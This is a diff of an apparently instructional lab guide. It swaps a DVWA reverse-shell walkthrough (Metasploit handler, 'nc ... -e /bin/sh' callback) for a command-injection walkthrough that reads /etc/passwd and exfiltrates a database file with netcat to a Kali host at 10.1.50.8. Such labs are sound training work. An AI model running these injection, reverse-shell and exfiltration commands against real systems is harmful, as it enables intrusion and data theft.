@@ -1,68 +1,54 @@
-Reverse Shell
-=============
+Command Injection Attacks
+=========================
 
-A reverse shell is a shell session established on a connection that is initiated from a remote machine, not from the attacker’s host. Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session on the target machine and continue their attack. Reverse shells can also work across a NAT or firewall.
+Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.
 
-#. Running a Command-and-Control Server in Kali
-     In the Kali Web Shell run the command:
+#. Configure DVWA Security (This makes the site vulnerable to allow attacks)
+     - In the Left Menus Select DVWA Security
+     - Change Impossible to **LOW** and Click Submit
 
-     .. code-block::
-
-       msfconsole
-
-     .. image:: ../images/Attacks/Picture12.png
-#. Running a ‘reverse-shell’ module on Kali
-     In the Kali Web Shell run the command:
+     .. image:: ../images/Attacks/Picture6.png
+#. Performing ‘Command-Injection’ Attack (view /etc/passwd)
+     in the data field type the command
 
      .. code-block::
 
-       use exploit/multi/handler
-       set PAYLOAD linux/x64/shell/reverse_tcp
-       set LHOST 10.1.50.8
-       run
+       8.8.8.8 | cat /etc/passwd
       
-     .. image:: ../images/Attacks/Picture13.png
-#. Run reverse shell command from DVWA
-     In the XRDP Web Browser for DVWA run the command:
+     .. image:: ../images/Attacks/Picture7.png
+#. Performing ‘Command-Injection’ Attack (view local directory files)
+     in the data field type the command
 
      .. code-block::
 
-       | nc 10.1.50.8 4444 -e /bin/sh &
+       | ls
 
-     .. image:: ../images/Attacks/Picture14.png
-#. Execute shell commands from Kali
-     In the Kali Web Shell **Press Enter 1x prior to running commands**
-  
-     .. code-block::
-
-       pwd
-       ls -AlFh
-
-     .. image:: ../images/Attacks/Picture15.png
-#. Open a New Web Shell in Kali
-
-     .. image:: ../images/Attacks/Picture16.png
-#. Setup Data Exfiltration from Kali (2nd Web Shell [New Shell Window])
+     .. image:: ../images/Attacks/Picture8.png
+#. Performing ‘Command-Injection’ Attack (data exfiltration using NetCat)
+     in Kali Linux Web Shell run the following commands to setup the receiving end of the Data Exfiltration
 
      .. code-block::
 
        cd /home/kali
-       rm Sample-DB.zip
+       ls
+       rm -rf Sample-Db.zip
+       ls
        nc -l -p 8888 > Sample-DB.zip
 
-     .. image:: ../images/Attacks/Picture17.png
-#. Run Data Exfiltration command from Kali (1st Web Shell [Reverse Shell Window])
+     .. image:: ../images/Attacks/Picture9.png
+#. Performing ‘Command-Injection’ Attack (data exfiltration using NetCat)
+     in the DVWA command injection area type the command
 
      .. code-block::
 
-       nc -w 3 10.1.50.8 8888 < Sample-DB.zip
+       | nc -w 3 10.1.50.8 8888 < Sample-DB.zip
 
-     .. image:: ../images/Attacks/Picture18.png
-#. Check Exfiltrated file on Kali from the compromised server (2nd Web Shell [New Shell Window])
-     If file has size (~93MB) then the data exfiltration was successful
+     .. image:: ../images/Attacks/Picture10.png
+#. Performing ‘Command-Injection’ Attack (data exfiltration using NetCat)
+     in the Kali Linux Web Shell the previous command should be completed and a new command line will be available verify size of file exfiltrated using command
 
      .. code-block::
 
-       ls -AlFh |grep -I Sample
+       ls -AlFh
 
-     .. image:: ../images/Attacks/Picture19.png
+     .. image:: ../images/Attacks/Picture11.png
